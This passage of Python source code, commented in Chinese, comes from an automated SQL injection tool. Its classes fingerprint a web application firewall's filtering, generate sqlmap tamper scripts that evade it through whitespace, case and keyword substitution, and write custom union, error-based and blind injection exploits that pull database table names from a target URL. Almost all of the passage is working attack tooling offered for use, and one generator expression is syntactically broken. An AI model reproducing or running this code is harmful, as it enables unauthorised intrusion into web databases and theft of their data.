        self._analyze_pattern(verbose=verbose)

        # 7. 判定复杂度
        if verbose:
            print(f"\n[7] 绕过复杂度判定...")
        self._determine_complexity(verbose=verbose)

        # 8. 构建可用工具箱
        if verbose:
            print(f"\n[8] 构建可用工具箱...")
        self._build_toolbox(verbose=verbose)

        if verbose:
            self.print_summary()

        return self

    def _analyze_pattern(self, verbose=True):
        """
        识别 WAF 检测模式:
        - none: 无 WAF 或极弱
        - keyword_only: 仅检测关键词本身 (大小写敏感/不敏感)
        - keyword_plus_space: 检测 关键词+空白字符 组合
        - keyword_case_insensitive: 大小写不敏感检测 (关键词全被拦截, 混合大小写也拦截)
        - keyword_regex: 正则匹配检测 (关键词变形/内联注释也拦截)
        - length_based: 基于 payload 长度检测
        - mixed: 混合模式
        """
        # 统计: 有多少关键词是 "单独 PASS 但 +空格 BLOCK"
        kw_only_space = 0
        kw_both_block = 0
        kw_alone_block = 0
        total_kw = 0

        for kw, res in self.results["keywords"].items():
            total_kw += 1
            if res["alone"] == "blocked" and res["with_space"] == "blocked":
                kw_both_block += 1
            elif res["alone"] == "pass" and res["with_space"] == "blocked":
                kw_only_space += 1
            elif res["alone"] == "blocked" and res["with_space"] == "pass":
                kw_alone_block += 1

        # 检测大小写不敏感 WAF
        case_bypass = self.results.get("case_bypass", {})
        case_insensitive = (case_bypass.get("keyword") == "blocked"
                           and case_bypass.get("function") == "blocked")

        # 检测正则匹配 WAF (内联注释也拦截 = 正则检测)
        inline_bypass = self.results.get("inline_comment_bypass", {})
        regex_detected = (inline_bypass.get("keyword") == "blocked"
                         and inline_bypass.get("function") == "blocked")

        # 检测长度限制 WAF (长 payload 被拦截但短 payload 正常)
        # 通过比较基准响应和探测响应来判断
        length_based = False
        base_len = self.results.get("base_response_len", 0)
        if base_len > 0:
            # 如果大部分空白替代符都被拦截但关键词单独不拦截,
            # 且空格替代符也被拦截, 可能是长度限制
            pass  # 需要更多数据才能判定, 先标记

        # 判定 WAF 模式 (优先级从高到低)
        if case_insensitive and kw_both_block / max(total_kw, 1) > 0.2:
            self.waf_pattern = "keyword_case_insensitive"
        elif regex_detected and kw_both_block / max(total_kw, 1) > 0.2:
            self.waf_pattern = "keyword_regex"
        elif total_kw > 0 and kw_only_space / total_kw > 0.3:
            self.waf_pattern = "keyword_plus_space"
        elif kw_both_block / max(total_kw, 1) > 0.3:
            self.waf_pattern = "keyword_only"
        elif kw_alone_block > 0:
            self.waf_pattern = "mixed"
        else:
            self.waf_pattern = "none"

        # 附加标记: 长度限制 (可与其他模式共存)
        # 如果 keyword_plus_space 但所有空白替代符都被拦截, 附加 length_based 标记
        if self.waf_pattern == "keyword_plus_space":
            all_ws_blocked = all(
                v == "blocked" for v in self.results["bypass_select"].values()
                if k != "paren" for k, v in self.results["bypass_select"].items()
            )
            if all_ws_blocked:
                self.waf_pattern = "keyword_plus_space+length"

        if verbose:
            print(f"  关键词单独拦截: {kw_both_block}/{total_kw}")
            print(f"  关键词+空白拦截: {kw_only_space}/{total_kw}")
            print(f"  仅+空白时拦截 (单独通过): {kw_only_space}/{total_kw}")
            if case_insensitive:
                print(f"  大小写不敏感: 是 (混合大小写也被拦截)")
            if regex_detected:
                print(f"  正则匹配检测: 是 (内联注释也被拦截)")
            print(f"  WAF 模式: {self.waf_pattern}")

    def _determine_complexity(self, verbose=True):
        """
        判定绕过复杂度:
        - simple: 只需空格替换/大小写混淆, tamper 即可
        - medium: 需要关键词替换 (select→SeLeCt, 等), tamper 可解
        - complex: 需要语义重构 (运算符→函数, limit→group_concat 等),
                   tamper 无法处理, 需自定义 exploit
        """
        score = 0
        reasons = []

        # 检查核心运算符是否被过滤
        blocked_ops = [op for op, res in self.results["operators"].items() if res == "blocked"]
        critical_ops = {"=", "and", "or", ">", "<"}
        blocked_critical = critical_ops & set(blocked_ops)
        if blocked_critical:
            score += 3
            reasons.append(f"核心运算符被过滤: {blocked_critical}")

        # 检查核心函数是否被过滤
        blocked_funcs = [f for f, res in self.results["functions"].items() if res == "blocked"]
        critical_funcs = {"substr", "ascii", "if", "case", "sleep"}
        blocked_critical_funcs = critical_funcs & set(blocked_funcs)
        if blocked_critical_funcs:
            score += 2
            reasons.append(f"核心函数被过滤: {blocked_critical_funcs}")

        # 检查逻辑运算符是否全被过滤
        logical_blocked = {"and", "or", "not", "&&", "||", "!"} & set(blocked_ops)
        if logical_blocked == {"and", "or", "not", "&&", "||", "!"}:
            score += 2
            reasons.append("所有逻辑运算符被过滤, 需要替代方案 (^)")

        # 检查 limit 是否不可绕过
        limit_pass = any(res == "pass" for res in self.results["bypass_limit"].values())
        if not limit_pass:
            score += 1
            reasons.append("limit 无法绕过, 需 group_concat 替代")

        # 检查 where 是否不可绕过
        where_pass = any(res == "pass" for res in self.results["bypass_where"].values())
        if not where_pass:
            score += 1
            reasons.append("where 无法绕过")

        # 检查大小写混淆是否可绕过 (仅降低关键词过滤的复杂度, 不影响运算符)
        case_bypass = self.results.get("case_bypass", {})
        if case_bypass.get("keyword") == "pass" or case_bypass.get("function") == "pass":
            # 大小写绕过对运算符无效 (=,>,< 不会被大小写绕过)
            # 只有当核心运算符未被全过滤时, 才降低复杂度
            if not blocked_critical:
                score -= 1
                reasons.append("大小写混淆可绕过部分过滤")
            else:
                reasons.append("大小写混淆可绕过, 但核心运算符仍被过滤")

        # 检查内联注释是否可绕过 (降低复杂度)
        inline_bypass = self.results.get("inline_comment_bypass", {})
        if inline_bypass.get("keyword") == "pass" or inline_bypass.get("function") == "pass":
            score -= 1
            reasons.append("内联注释可绕过部分过滤")

        # 检查双重编码是否可绕过 (降低复杂度)
        if self.results.get("double_encode_bypass") == "pass":
            score -= 1
            reasons.append("双重编码可绕过部分过滤")

        score = max(score, 0)  # 最低 0 分

        if score >= 5:
            self.complexity = "complex"
        elif score >= 2:
            self.complexity = "medium"
        else:
            self.complexity = "simple"

        if verbose:
            print(f"  复杂度评分: {score}")
            for r in reasons:
                print(f"    - {r}")
            print(f"  复杂度等级: {self.complexity}")

    def _build_toolbox(self, verbose=True):
        """
        根据探测结果构建可用的工具箱
        """
        # 逻辑运算符
        for op in ["^", "-", "/", "%"]:
            if self.results["operators"].get(op) == "pass":
                self.available["logical_ops"].append(op)
        # xor (^) 特殊处理: 即使在 operators 探测中, ^ 可能用于位运算
        # 但在 SQL 中 ^ 也可做逻辑异或

        # 比较函数 (替代 =, >, <)
        for func in ["locate", "instr", "strcmp", "least", "greatest"]:
            if self.results["functions"].get(func) == "pass":
                self.available["compare_funcs"].append(func)

        # 字符提取函数
        extract_combos = []
        if self.results["functions"].get("ord") == "pass":
            if self.results["functions"].get("left") == "pass":
                extract_combos.append("ord(left(str,pos))")
            if self.results["functions"].get("right") == "pass":
                extract_combos.append("ord(right(left(str,pos),1))")
        if self.results["functions"].get("ascii") == "pass":
            if self.results["functions"].get("substr") == "pass":
                extract_combos.append("ascii(substr(str,pos,1))")
            if self.results["functions"].get("substring") == "pass":
                extract_combos.append("ascii(substring(str,pos,1))")
            if self.results["functions"].get("mid") == "pass":
                extract_combos.append("ascii(mid(str,pos,1))")
        self.available["extract_funcs"] = extract_combos

        # 注入函数
        for func in ["updatexml", "extractvalue", "floor", "exp"]:
            if self.results["functions"].get(func) == "pass":
                self.available["inject_funcs"].append(func)

        # 信息函数
        for func in ["database", "version", "user", "current_user", "schema"]:
            if self.results["functions"].get(func) == "pass":
                self.available["info_funcs"].append(func)

        # 字符串函数
        for func in ["concat", "group_concat", "length", "left", "right",
                      "reverse", "trim", "lpad", "rpad", "elt", "replace",
                      "upper", "lower"]:
            if self.results["functions"].get(func) == "pass":
                self.available["string_funcs"].append(func)

        # 注释符
        for name, res in self.results["comments"].items():
            if res == "pass":
                self.available["comments"].append(name)

        # 绕过方式
        for kw_type in ["bypass_select", "bypass_from", "bypass_where", "bypass_limit"]:
            self.available["bypasses"][kw_type] = [
                name for name, res in self.results[kw_type].items() if res == "pass"
            ]

        # 数据库类型检测 (通过 version() 函数可用性 + 错误信息中的数据库标识)
        db_type = "mysql"  # 默认 MySQL
        version_str = ""
        # 检查 WAF 探测阶段的响应中是否包含数据库版本标识
        for key, result in self.results.items():
            if isinstance(result, str) and len(result) > 10:
                vl = result.lower()
                if "postgresql" in vl or "postgres" in vl:
                    db_type = "postgresql"
                    break
                elif "microsoft" in vl and "sql server" in vl:
                    db_type = "mssql"
                    break
                elif "oracle" in vl:
                    db_type = "oracle"
                    break
                elif "sqlite" in vl:
                    db_type = "sqlite"
                    break
                elif "mariadb" in vl:
                    db_type = "mysql"  # MariaDB 兼容 MySQL 语法
                    version_str = "mariadb"
                    break
        self.available["db_type"] = db_type

        # 新增绕过方式: 大小写混淆 / 内联注释 / 双重编码
        self.available["bypasses"]["case_bypass"] = self.results.get("case_bypass", {})
        self.available["bypasses"]["inline_comment_bypass"] = self.results.get("inline_comment_bypass", {})
        self.available["bypasses"]["double_encode_bypass"] = self.results.get("double_encode_bypass", "")

        if verbose:
            print(f"  逻辑运算符: {self.available['logical_ops']}")
            print(f"  比较函数: {self.available['compare_funcs']}")
            print(f"  字符提取: {self.available['extract_funcs']}")
            print(f"  注入函数: {self.available['inject_funcs']}")
            print(f"  信息函数: {self.available['info_funcs']}")
            print(f"  字符串函数: {self.available['string_funcs']}")
            print(f"  注释符: {self.available['comments']}")
            print(f"  数据库类型: {self.available['db_type']}")
            print(f"  绕过方式: {json.dumps(self.available['bypasses'], indent=2)}")

    def print_summary(self):
        """打印分析摘要"""
        print("\n" + "=" * 70)
        print("WAF 分析摘要")
        print("=" * 70)
        print(f"  WAF 模式: {self.waf_pattern}")
        print(f"  绕过复杂度: {self.complexity}")
        print(f"\n  可用逻辑运算符: {self.available['logical_ops']}")
        print(f"  可用比较函数: {self.available['compare_funcs']}")
        print(f"  可用字符提取: {self.available['extract_funcs']}")
        print(f"  可用注入函数: {self.available['inject_funcs']}")
        print(f"  可用信息函数: {self.available['info_funcs']}")
        print(f"  可用注释符: {self.available['comments']}")
        print(f"  绕过方式:")
        for k, v in self.available["bypasses"].items():
            print(f"    {k}: {v}")

        print(f"\n  建议:")
        if self.complexity == "simple":
            print("    → 生成 sqlmap tamper 脚本, 交 sqlmap 自动注入")
        elif self.complexity == "medium":
            print("    → 生成 sqlmap tamper 脚本 (含关键词替换), 交 sqlmap 自动注入")
        else:
            print("    → 复杂 WAF, 生成自定义 exploit 脚本 (tamper 无法处理语义重构)")

    def to_dict(self):
        """序列化为字典"""
        return {
            "waf_pattern": self.waf_pattern,
            "complexity": self.complexity,
            "results": self.results,
            "available": self.available,
        }


# ============================================================
# Tamper 生成器: 为简单/中等 WAF 生成 sqlmap tamper 脚本
# ============================================================

class TamperGenerator:
    """
    根据 WAF 分析结果生成 sqlmap tamper 脚本
    支持: 空格替换, 关键词大小写混淆, 关键词替换, 注释绕过
    """

    def __init__(self, analysis: WAFAnalysis):
        self.analysis = analysis
        self.rules = []  # 替换规则列表

    def generate(self, output_path=None):
        """
        生成 tamper 脚本, 返回脚本内容字符串
        """
        self._build_rules()

        tamper_code = self._render_tamper()

        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(tamper_code)
            print(f"\n[+] Tamper 脚本已保存: {output_path}")

        return tamper_code

    def _build_rules(self):
        """
        根据分析结果构建替换规则
        """
        results = self.analysis.results

        # 1. 空格替换: 找到可用的空白替代符
        blocked_space = results["operators"].get("=", "pass")  # 间接判断 WAF 是否在
        # 更准确: 看 select+空白是否被拦截
        select_ws_blocked = results["bypass_select"]
        all_select_blocked = all(v == "blocked" for v in select_ws_blocked.values())

        # 找可用的空白替代符
        for ws_name, ws_result in select_ws_blocked.items():
            if ws_result == "pass" and ws_name != "paren":
                ws_map = {
                    "LF": "%0a", "CR": "%0d", "TAB": "%09",
                    "VT": "%0b", "FF": "%0c", "NBSP": "%a0",
                }
                if ws_name in ws_map:
                    self.rules.append({
                        "type": "space_replace",
                        "from": " ",
                        "to": ws_map[ws_name],
                        "desc": f"空格 → {ws_name}",
                    })
                    break

        # 2. 关键词大小写混淆 (对单独被拦截的关键词)
        for kw, res in results["keywords"].items():
            if res["alone"] == "blocked" and res["with_space"] == "blocked":
                # 关键词被完全拦截, 尝试大小写混淆
                mixed = self._mix_case(kw)
                if mixed != kw:
                    self.rules.append({
                        "type": "case_mix",
                        "from": kw,
                        "to": mixed,
                        "desc": f"{kw} → {mixed} (大小写混淆)",
                    })

        # 3. 关键词+空白 → 关键词( (括号绕过)
        for kw, res in results["keywords"].items():
            if res["alone"] == "pass" and res["with_space"] == "blocked":
                if kw in ("select", "from", "where"):
                    self.rules.append({
                        "type": "paren_bypass",
                        "keyword": kw,
                        "desc": f"{kw} + 空格 被拦截, 使用 {kw}( 绕过",
                    })

        # 4. 注释符替换
        available_comments = [name for name, res in results["comments"].items() if res == "pass"]
        if "hash" in available_comments:
            self.rules.append({
                "type": "comment_replace",
                "from": "-- ",
                "to": "#",
                "desc": "-- → # (注释符替换)",
            })

        # 5. 运算符等价替换 (如果被过滤)
        blocked_ops = {op: res for op, res in results["operators"].items() if res == "blocked"}

        # = → like (简单 WAF 场景)
        if "=" in blocked_ops:
            if "like" not in blocked_ops:
                self.rules.append({
                    "type": "operator_func",
                    "from": "=",
                    "to": "like",
                    "desc": "= → LIKE (运算符替换, 仅适用于简单比较)",
                    "note": "LIKE 无法替代 = 在子查询中的用法, 复杂场景需自定义 exploit"
                })

        # and → && (如果 and 被过滤但 && 可用)
        if "and" in blocked_ops and results["operators"].get("&&") == "pass":
            self.rules.append({
                "type": "keyword_equiv",
                "from": "and",
                "to": "&&",
                "desc": "and → && (逻辑运算符等价替换)",
            })

        # or → || (如果 or 被过滤但 || 可用)
        if "or" in blocked_ops and results["operators"].get("||") == "pass":
            self.rules.append({
                "type": "keyword_equiv",
                "from": "or",
                "to": "||",
                "desc": "or → || (逻辑运算符等价替换)",
            })

        # 6. 函数等价替换 (如果核心函数被过滤)
        blocked_funcs = {f: res for f, res in results["functions"].items() if res == "blocked"}
        av = self.analysis.available

        # substr → left+right 组合 (如果 substr 被过滤)
        if "substr" in blocked_funcs and "left" in av.get("string_funcs", []):
            self.rules.append({
                "type": "operator_func",
                "from": "substr",
                "to": "left/right",
                "desc": "substr → left()+right() (函数等价替换)",
                "note": "需自定义 exploit 实现语义重构"
            })

        # ascii → ord (如果 ascii 被过滤但 ord 可用)
        if "ascii" in blocked_funcs and "ord" in av.get("string_funcs", []):
            self.rules.append({
                "type": "keyword_equiv",
                "from": "ascii",
                "to": "ord",
                "desc": "ascii → ord (函数等价替换)",
            })

    def _mix_case(self, keyword):
        """大小写混淆: union → UnIoN"""
        result = []
        for i, ch in enumerate(keyword):
            if i % 2 == 0:
                result.append(ch.upper())
            else:
                result.append(ch.lower())
        return "".join(result)

    def _render_tamper(self):
        """渲染 tamper 脚本代码"""
        rules_json = json.dumps(self.rules, indent=2, ensure_ascii=False)
        # 生成 Python 可执行的列表字面量 (用 repr 不可行, 会变成字符串)
        import pprint
        rules_py = pprint.pformat(self.rules, indent=2, width=120)

        tamper_code = f'''#!/usr/bin/env python3
"""
sqlmap tamper 脚本 (自动生成)
生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
WAF 模式: {self.analysis.waf_pattern}
绕过复杂度: {self.analysis.complexity}

替换规则:
{rules_json}

使用方式:
  sqlmap -u "TARGET_URL" --tamper=waf_bypass_tamper.py --batch

注意: 此 tamper 处理字符级替换和简单语义替换。
      对于需要复杂语义重构的 WAF (如 =→locate(), and→^, limit→group_concat),
      请使用生成的自定义 exploit 脚本。
"""

import re

# 替换规则 (从 WAF 分析结果导入)
RULES = {rules_py}

def tamper(payload, **kwargs):
    """
    对 sqlmap payload 应用 WAF 绕过替换
    支持组合策略: 多条规则依次应用
    """
    if not payload:
        return payload

    for rule in RULES:
        rtype = rule["type"]

        if rtype == "space_replace":
            # 空格替换为空白替代符
            payload = payload.replace(rule["from"], rule["to"])

        elif rtype == "case_mix":
            # 关键词大小写混淆 (正则, 不区分大小写)
            pattern = re.compile(re.escape(rule["from"]), re.IGNORECASE)
            payload = pattern.sub(rule["to"], payload)

        elif rtype == "comment_replace":
            # 注释符替换
            payload = payload.replace(rule["from"], rule["to"])

        elif rtype == "paren_bypass":
            # 关键词+空格 -> 关键词(  (select  -> select()
            # NOTE: 括号闭合由 sqlmap 的后续 payload 语法保证
            kw = rule["keyword"]
            pattern = re.compile(r'\\b' + kw + r'\\s+(?!\\()', re.IGNORECASE)
            payload = pattern.sub(kw + '(', payload)

        elif rtype == "operator_func":
            # 运算符→函数替换 (如 = → locate())
            # tamper 只能做简单替换, 复杂语义重构需自定义 exploit
            # = → locate(A, B) 无法在 tamper 中自动实现, 仅做标记提示
            # 但可以替换 = 为 LIKE 或其他简单替代
            op = rule["from"]
            if op == "=" and "like" not in payload.lower():
                # 不替换 WHERE 中的 = (需要语义重构), 仅替换比较表达式
                # 这是一个保守策略, 避免 break sqlmap 的 payload 结构
                pass  # 跳过, 需要自定义 exploit

        elif rtype == "keyword_equiv":
            # 关键词等价替换 (如 and → &&)
            payload = re.sub(
                r'\\b' + re.escape(rule["from"]) + r'\\b',
                rule["to"],
                payload,
                flags=re.IGNORECASE
            )

    return payload
'''
        return tamper_code


# ============================================================
# Exploit 生成器: 为复杂 WAF 生成自定义注入脚本
# ============================================================

class ExploitGenerator:
    """
    根据 WAF 分析结果生成自定义 exploit 脚本
    自动选择可用的函数组合, 生成盲注/报错注入脚本骨架
    """

    def __init__(self, analysis: WAFAnalysis, url, param,
                 quote="'", comment="#", waf_mark=None,
                 success_mark=None, method='GET', content_type='form'):
        self.analysis = analysis
        self.url = url
        self.param = param
        self.quote = quote
        self.comment = comment
        self.waf_mark = waf_mark or ""
        self.success_mark = success_mark or ""
        self.method = method
        self.content_type = content_type

    def generate(self, output_path=None):
        """生成 exploit 脚本"""
        self._output_path = output_path  # 保存供 _render_exploit 使用
        code = self._render_exploit()

        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(code)
            print(f"\n[+] Exploit 脚本已保存: {output_path}")

        return code

    def _determine_injection_type(self):
        """
        决定注入策略:
        1. UNION 注入 (union+select 可用且有回显)
        2. 报错注入 (updatexml/extractvalue/floor 可用)
        3. 布尔盲注 (有可用的逻辑运算符 + 字符提取函数)
        4. 时间盲注 (sleep/benchmark 可用)
        """
        av = self.analysis.available
        bypasses = av.get("bypasses", {})

        # UNION 注入需要: union 可绕过, select 可绕过, 且 union+select 可同时使用
        # 注意: keyword_plus_space 模式下 union select(中间有空格) 会被拦截
        # 必须检查 union + 空白替代符 组合是否可用
        waf_pattern = getattr(self.analysis, 'waf_pattern', '')
        union_bypasses = bypasses.get("bypass_union", [])
        select_bypasses = bypasses.get("bypass_select", [])

        # UNION 可用条件: 关键词单独不被拦截(或有大写绕过) 且关键词+空白替代符可用
        # 注: WAF 探测不单独测 union 绕过, 复用 select 绕过结果 (绕过方式一致)
        select_bypasses = bypasses.get("bypass_select", [])
        union_bypasses = select_bypasses  # union 和 select 绕过方式一致

        # 如果 WAF 是 keyword_plus_space, 需要空白替代符绕过才可用
        if waf_pattern == "keyword_plus_space":
            ws_bypasses = [b for b in select_bypasses if b not in ("upper", "paren")]
            union_usable = len(ws_bypasses) > 0
            select_usable = len(ws_bypasses) > 0 or "paren" in select_bypasses
        else:
            union_usable = bool(union_bypasses)
            select_usable = bool(select_bypasses)

        if union_usable and select_usable:
            return "union"

        # 其次报错注入
        if "updatexml" in av["inject_funcs"]:
            return "error_updatexml"
        if "extractvalue" in av["inject_funcs"]:
            return "error_extractvalue"
        if "floor" in av["inject_funcs"] and "count" in av["inject_funcs"]:
            return "error_floor"

        # 布尔盲注
        if av["logical_ops"] and av["extract_funcs"]:
            return "boolean_blind"

        # 时间盲注
        if "sleep" in av["inject_funcs"] or "benchmark" in av["inject_funcs"]:
            return "time_blind"

        return "unknown"

    def _get_bypass_syntax(self):
        """
        根据分析结果确定绕过语法
        返回: select_bypass, from_bypass, where_bypass, limit_bypass
        """
        av = self.analysis.available
        bypasses = av["bypasses"]

        # select 绕过
        if "paren" in bypasses.get("bypass_select", []):
            sel = "select("  # select(expr)
        elif bypasses.get("bypass_select"):
            # 用第一个可用的空白替代符
            ws_map = {"LF": "%0a", "CR": "%0d", "TAB": "%09",
                      "VT": "%0b", "FF": "%0c", "NBSP": "%a0"}
            first = bypasses["bypass_select"][0]
            sel = f"select{ws_map.get(first, ' ')}"
        else:
            sel = "select "

        # from 绕过
        if "paren" in bypasses.get("bypass_from", []):
            frm = "from("
        elif bypasses.get("bypass_from"):
            ws_map = {"LF": "%0a", "CR": "%0d", "TAB": "%09",
                      "VT": "%0b", "FF": "%0c", "NBSP": "%a0"}
            first = bypasses["bypass_from"][0]
            frm = f"from{ws_map.get(first, ' ')}"
        else:
            frm = "from "

        # where 绕过
        if "paren" in bypasses.get("bypass_where", []):
            whr = "where("
        elif bypasses.get("bypass_where"):
            ws_map = {"LF": "%0a", "CR": "%0d", "TAB": "%09",
                      "VT": "%0b", "FF": "%0c", "NBSP": "%a0"}
            first = bypasses["bypass_where"][0]
            whr = f"where{ws_map.get(first, ' ')}"
        else:
            whr = "where "

        # limit 绕过
        if "paren" in bypasses.get("bypass_limit", []):
            lmt = "limit("
        elif bypasses.get("bypass_limit"):
            ws_map = {"LF": "%0a", "CR": "%0d", "TAB": "%09",
                      "VT": "%0b", "FF": "%0c", "NBSP": "%a0"}
            first = bypasses["bypass_limit"][0]
            lmt = f"limit{ws_map.get(first, ' ')}"
        else:
            lmt = "limit "

        return sel, frm, whr, lmt

    def _get_compare_func(self):
        """获取可用的比较函数 (替代 =)"""
        av = self.analysis.available
        if "locate" in av["compare_funcs"]:
            return "locate"
        if "instr" in av["compare_funcs"]:
            return "instr"
        if "strcmp" in av["compare_funcs"]:
            return "strcmp"
        return None

    def _get_extract_expr(self, var, pos):
        """获取字符提取表达式"""
        av = self.analysis.available
        for combo in av["extract_funcs"]:
            if "ord(left" in combo:
                return f"ord(left({var},{pos}))"
            if "ord(right(left" in combo:
                return f"ord(right(left({var},{pos}),1))"
            if "ascii(substr" in combo:
                return f"ascii(substr({var},{pos},1))"
            if "ascii(substring" in combo:
                return f"ascii(substring({var},{pos},1))"
            if "ascii(mid" in combo:
                return f"ascii(mid({var},{pos},1))"
        return f"ord(left({var},{pos}))"  # fallback

    def _render_exploit(self):
        """渲染 exploit 脚本"""
        inj_type = self._determine_injection_type()
        sel, frm, whr, lmt = self._get_bypass_syntax()
        compare_func = self._get_compare_func()
        av = self.analysis.available

        # 选择逻辑运算符
        logical_op = av["logical_ops"][0] if av["logical_ops"] else "^"

        # 选择盲注前缀 (不存在用户名)
        blind_prefix = "zzzz"

        # 判断是否有 group_concat (替代 limit)
        has_group_concat = "group_concat" in av["string_funcs"]

        # 决定数据获取策略
        if has_group_concat:
            data_strategy = "group_concat"
        else:
            limit_bypasses = av["bypasses"].get("bypass_limit", [])
            limit_has_ws_bypass = any(b != "paren" for b in limit_bypasses)
            data_strategy = "limit" if limit_has_ws_bypass else "group_concat"

        # 动态选择报错函数
        if "updatexml" in av["inject_funcs"]:
            error_func = "updatexml"
            error_call = "updatexml(1,concat(0x7e,EXPR),1)"
        elif "extractvalue" in av["inject_funcs"]:
            error_func = "extractvalue"
            error_call = "extractvalue(1,concat(0x7e,EXPR))"
        else:
            error_func = "floor"
            error_call = "floor"

        # 构建 SELECT 表达式（修复括号闭合逻辑）
        # 当 sel="select(" → select(expr)from(table)  → 需要 sel + content + ")" + frm + table + ")"
        # 当 sel="select%a0" → select%a0content%a0from%a0table  → 需要 sel + content + frm + table
        sel_is_paren = sel.endswith("(")
        frm_is_paren = frm.endswith("(")
        whr_is_paren = whr.endswith("(")

        def build_select(content, table, where_cond=""):
            """构建 SELECT 表达式"""
            parts = [sel, content]
            if sel_is_paren:
                parts.append(")")
            parts.append(frm)
            parts.append(table)
            if frm_is_paren:
                parts.append(")")
            if where_cond:
                parts.append(whr)
                parts.append(where_cond)
                if whr_is_paren:
                    parts.append(")")
            return "".join(parts)

        # 构建 SQL 查询表达式（用于模板生成）
        # NOTE: 使用 build_select() 而非手动拼接，确保括号闭合正确
        if data_strategy == "group_concat":
            table_expr = build_select("group_concat(table_name)", "information_schema.tables",
                                      f"{compare_func}(database(),table_schema)" if compare_func else "")
        else:
            table_expr = build_select("table_name", "information_schema.tables",
                                      f"{compare_func}(database(),table_schema)" if compare_func else "")

        # 获取字符提取表达式（使用工具箱结果，而非硬编码）
        extract_expr = self._get_extract_expr("VAR", "POS")

        # 构建报错注入调用模板
        if error_func == "updatexml":
            error_call_tpl = "updatexml(1,concat(0x7e,EXPR),1)"
        elif error_func == "extractvalue":
            error_call_tpl = "extractvalue(1,concat(0x7e,EXPR))"
        else:
            error_call_tpl = ""  # floor 类型单独处理

        # 构建 limit 表达式 (仅 limit 策略时使用)
        limit_expr = ""
        if data_strategy == "limit":
            limit_expr = lmt + "{OFFSET},1"

        # 构建 UNION 绕过语法
        if inj_type == "union":
            # UNION SELECT 之间的空格需要用绕过方式替代
            bypasses = av.get("bypasses", {})
            ws_map = {"LF": "%0a", "CR": "%0d", "TAB": "%09",
                      "VT": "%0b", "FF": "%0c", "NBSP": "%a0"}
            sel_bypasses = bypasses.get("bypass_select", [])

            # union 绕过: 优先用空白替代符 (NBSP等), 因为 union(select...) 语法不合法
            union_ws = " "
            for b in sel_bypasses:
                if b in ws_map:
                    union_ws = ws_map[b]
                    break

            # union 关键词: 如果单独被拦截, 用大小写绕过
            union_kw = "union"
            case_bypass = self.analysis.results.get("case_bypass", {})
            if "union" in self.analysis.results.get("keywords_blocked_alone", set()):
                if case_bypass.get("keyword") == "pass":
                    union_kw = "UniOn"

            # select 关键词: 如果单独被拦截, 用大小写绕过
            select_kw = "select"
            if "select" in self.analysis.results.get("keywords_blocked_alone", set()):
                if case_bypass.get("keyword") == "pass":
                    select_kw = "SeLeCt"

            union_sep = f"{union_kw}{union_ws}"  # "union%a0" 或 "UniOn%a0"
        else:
            union_sep = "union "
            union_kw = "union"
            select_kw = "select"
            union_ws = " "

        # 注入方法
        inj_method = self.method or "GET"
        inj_content_type = self.content_type or "form"

        # 生成脚本
        exploit_code = f'''#!/usr/bin/env python3
"""
自定义 SQL 注入 Exploit (自动生成)
生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

目标: {self.url}
注入参数: {self.param}
注入方法: {inj_method}
注入类型: {inj_type}
WAF 模式: {self.analysis.waf_pattern}
复杂度: {self.analysis.complexity}

绕过策略:
  select 绕过: {repr(sel)}
  from   绕过: {repr(frm)}
  where  绕过: {repr(whr)}
  limit  绕过: {repr(lmt)}
  逻辑运算符: {logical_op}
  比较函数: {compare_func or "N/A"}
  报错函数: {error_func}
  字符提取: {av['extract_funcs'][:3] if av['extract_funcs'] else 'N/A'}
  数据策略: {data_strategy}

使用方式:
  python {os.path.basename(self._output_path) if self._output_path else 'exploit_gen.py'}

可用函数:
  注入函数: {av['inject_funcs']}
  信息函数: {av['info_funcs']}
  字符串函数: {av['string_funcs']}
  比较函数: {av['compare_funcs']}
"""

import re
import sys
import time

try:
    import requests
except ImportError:
    print("[!] 需要安装 requests: pip install requests")
    sys.exit(1)

# ============================================================
# 配置 (由 waf_analyzer 自动填充)
# ============================================================

TARGET = "{self.url}"
PARAM = "{self.param}"
METHOD = "{inj_method}"
CONTENT_TYPE = "{inj_content_type}"
QUOTE = "{self.quote}"
COMMENT = "{self.comment}"
WAF_MARK = "{self.waf_mark or ''}"
SUCCESS_MARK = "{self.success_mark or ''}"

# 绕过语法
SEL = "{sel}"
FRM = "{frm}"
WHR = "{whr}"
LMT = "{lmt}"

# 注入配置
LOGICAL_OP = "{logical_op}"
BLIND_PREFIX = "{blind_prefix}"
COMPARE_FUNC = "{compare_func or ''}"
INJ_TYPE = "{inj_type}"
DATA_STRATEGY = "{data_strategy}"
ERROR_FUNC = "{error_func}"
ERROR_CALL = "{error_call_tpl}"
DB_TYPE = "{self.analysis.available.get('db_type', 'mysql')}"  # 数据库类型: mysql/postgresql/mssql/oracle/sqlite

# UNION 注入配置 (仅 INJ_TYPE=="union" 时生效)
UNION_SEP = "{union_sep}"
UNION_KW = "{union_kw}"
SELECT_KW = "{select_kw}"
UNION_WS = "{union_ws}"

# 括号闭合标记 (True=使用括号闭合, 如 select(...)
SEL_IS_PAREN = {sel_is_paren}
FRM_IS_PAREN = {frm_is_paren}
WHR_IS_PAREN = {whr_is_paren}

# HTTP 配置
COOKIES = {{}}  # 如需 Cookie: {{"key": "value"}}
HEADERS = {{}}   # 如需自定义 Header
PROXY = None     # 如需代理: "http://127.0.0.1:7890"
TIMEOUT = 15
DELAY = 0.5      # 请求间隔 (秒), 避免触发频率限制

# 注入位置: "param" (URL参数/表单字段, 默认), "cookie" (Cookie字段), "header" (HTTP头)
INJ_LOCATION = "param"

# URL 编码映射 (特殊字符需手动编码, 避免 requests 自动编码)
ENCODE_MAP = {{"'": "%27", "#": "%23", " ": "%0a"}}


def send(payload):
    """发送注入 payload (使用 requests, 手动 URL 编码)"""
    import re as _re
    encoded = ""
    for ch in payload:
        if ch in ENCODE_MAP:
            encoded += ENCODE_MAP[ch]
        else:
            encoded += ch

    url = _re.sub(r'([?&]' + PARAM + r'=)[^&]*', r'\\g<1>' + encoded, TARGET)

    proxies = {{"http": PROXY, "https": PROXY}} if PROXY else None

    # 构造注入位置的 payload
    _cookies = dict(COOKIES) if COOKIES else {{}}
    _headers = dict(HEADERS) if HEADERS else {{}}
    if INJ_LOCATION == "cookie":
        _cookies[PARAM] = encoded
    elif INJ_LOCATION == "header":
        _headers[PARAM] = encoded

    try:
        if INJ_LOCATION in ("cookie", "header"):
